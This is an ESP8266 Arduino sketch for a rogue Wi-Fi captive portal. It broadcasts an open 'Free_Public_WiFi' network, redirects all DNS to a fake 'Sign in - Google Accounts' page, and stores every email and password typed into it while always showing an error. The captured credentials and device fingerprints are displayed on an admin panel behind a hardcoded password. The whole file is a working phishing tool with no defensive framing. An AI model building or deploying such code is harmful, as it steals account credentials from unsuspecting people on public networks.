#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// Wi-Fi credentials for the fake network
const char* ssid = "Free_Public_WiFi";
const char* password = "";

// Admin credentials
const char* adminUsername = "admin";
const char* adminPassword = "password123"; // Ensure that this password is correct for admin login

// DNS and server objects
DNSServer dnsServer;
AsyncWebServer server(80);

// Data storage
String capturedCredentials = "";
String connectedDevices = "";
int totalLoginAttempts = 0;
int uniqueDevices = 0;

// Function to classify devices based on User-Agent, RSSI, and MAC address
String classifyDevice(String userAgent, int32_t rssi, String macAddress) {
  String deviceType;
  if (userAgent.indexOf("Android") > -1) deviceType = "Android Device";
  else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) deviceType = "iOS Device";
  else if (userAgent.indexOf("Windows") > -1) deviceType = "Windows Device";
  else if (userAgent.indexOf("Macintosh") > -1) deviceType = "MacOS Device";
  else if (userAgent.indexOf("Linux") > -1) deviceType = "Linux Device";
  else if (rssi > -50) deviceType = "Nearby Device";
  else if (rssi > -70) deviceType = "Medium Range Device";
  else deviceType = "Far Device";

  return deviceType + " | MAC: " + macAddress + " | RSSI: " + String(rssi) + " dBm";
}

// Generate the fake Google login page
String generateLoginPage(String errorMessage = "") {
  return R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Google Accounts</title>
      <style>
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        body {
          font-family: Arial, sans-serif;
          background-color: #f5f5f5;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
        }

        .container {
          background-color: #ffffff;
          border-radius: 8px;
          padding: 40px;
          width: 100%;
          max-width: 380px;
          box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
          text-align: center;
        }

        .logo {
          font-size: 50px;
          font-weight: 500;
          margin-bottom: 30px;
        }

        .logo span {
          color: #4285F4; /* Blue for 'G' */
        }

        .logo span:nth-child(2) {
          color: #DB4437; /* Red for the first 'O' */
        }

        .logo span:nth-child(3) {
          color: #FBBC05; /* Yellow for the second 'O' */
        }

        .logo span:nth-child(4) {
          color: #34A853; /* Green for 'g' */
        }

        .logo span:nth-child(5) {
          color: #DB4437; /* Red for 'l' */
        }

        .logo span:nth-child(6) {
          color: #4285F4; /* Blue for 'e' */
        }

        input {
          width: 100%;
          padding: 14px;
          margin: 10px 0;
          border: 1px solid #dcdcdc;
          border-radius: 4px;
          font-size: 16px;
          color: #333;
          font-family: Arial, sans-serif;
        }

        input[type="email"]:focus, input[type="password"]:focus {
          border-color: #1a73e8;
          outline: none;
        }

        button {
          width: 100%;
          padding: 14px;
          background-color: #1a73e8;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 16px;
          cursor: pointer;
          font-family: Arial, sans-serif;
          transition: background-color 0.2s;
        }

        button:hover {
          background-color: #1765c3;
        }

        .error {
          color: red;
          font-size: 14px;
          margin-bottom: 15px;
        }

        .footer {
          font-size: 14px;
          color: #555;
          margin-top: 20px;
        }

        .footer a {
          color: #1a73e8;
          text-decoration: none;
        }

        .footer a:hover {
          text-decoration: underline;
        }

        @media (max-width: 600px) {
          .container {
            padding: 30px;
            max-width: 90%;
          }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">
          <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <form method="POST" action="/submit">
          <input type="email" name="email" placeholder="Email or phone" required>
          <input type="password" name="password" placeholder="Enter your password" required>
          <button type="submit">Sign in</button>
        </form>
        )rawliteral" + (errorMessage != "" ? "<div class='error'>" + errorMessage + "</div>" : "") + R"rawliteral(
        <div class="footer">
          <p>By signing in, you agree to our <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.</p>
        </div>
      </div>
    </body>
    </html>
  )rawliteral";
}

// Function to handle login form submissions
void handleLogin(AsyncWebServerRequest *request) {
  if (request->hasParam("email", true) && request->hasParam("password", true)) {
    String email = request->getParam("email", true)->value();
    String password = request->getParam("password", true)->value();
    totalLoginAttempts++;

    // Save credentials
    capturedCredentials += "Email: " + email + ", Password: " + password + "\n";

    // Redirect with error message
    request->redirect("/login?error=Invalid+credentials");
  } else {
    request->redirect("/login");
  }
}

// Function to capture device details
void captureDeviceDetails(AsyncWebServerRequest *request) {
  String userAgent = request->header("User-Agent");
  int32_t rssi = WiFi.RSSI();
  String macAddress = WiFi.softAPmacAddress();

  String deviceInfo = classifyDevice(userAgent, rssi, macAddress);
  connectedDevices += deviceInfo + "\n";
  uniqueDevices++;
}

// Function to generate the admin panel
String generateAdminPanel() {
  String panel = R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Admin Panel</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: #f5f5f5;
          margin: 0;
          padding: 20px;
        }
        table {
          width: 100%;
          border-collapse: collapse;
        }
        th, td {
          padding: 10px;
          border: 1px solid #ddd;
          text-align: left;
        }
        th {
          background: #1a73e8;
          color: white;
        }
      </style>
    </head>
    <body>
      <h1>Admin Panel</h1>
      <h2>Captured Credentials</h2>
      <pre>)rawliteral" + capturedCredentials + R"rawliteral(</pre>
      <h2>Connected Devices</h2>
      <pre>)rawliteral" + connectedDevices + R"rawliteral(</pre>
      <h3>Total Login Attempts: )rawliteral" + String(totalLoginAttempts) + R"rawliteral(</h3>
      <h3>Unique Devices: )rawliteral" + String(uniqueDevices) + R"rawliteral(</h3>
    </body>
    </html>
  )rawliteral";

  return panel;
}

// Setup the server and routes
void setup() {
  Serial.begin(115200);

  // Start Wi-Fi
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Define routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    captureDeviceDetails(request);
    request->redirect("/login");
  });

  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request) {
    String error = request->hasParam("error") ? request->getParam("error")->value() : "";
    request->send(200, "text/html", generateLoginPage(error));
  });

  server.on("/submit", HTTP_POST, handleLogin);

  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (request->authenticate(adminUsername, adminPassword)) {
      request->send(200, "text/html", generateAdminPanel());
    } else {
      request->requestAuthentication();
    }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
